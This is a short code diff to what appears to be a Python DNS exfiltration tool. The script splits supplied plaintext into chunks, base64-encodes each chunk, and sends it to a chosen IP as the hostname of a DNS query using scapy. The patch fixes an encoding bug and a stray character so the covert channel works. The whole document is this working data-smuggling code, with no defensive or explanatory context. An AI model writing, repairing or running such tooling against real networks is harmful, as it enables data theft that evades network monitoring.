@@ -23,8 +23,8 @@ def main():
     n=63-len(suffix)
     chunks = [args.plaintext[i:i+n] for i in range(0, len(args.plaintext), n)]
     for element in chunks:
-        url = str(base64.b64encode(element)) + suffix
+        url = (base64.b64encode(element.encode("utf-8")).decode()) + suffix
         send(IP(dst=args.destinationIP)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=url,qtype="A")))
 
 if __name__ == "__main__":
-    main()11
+    main()
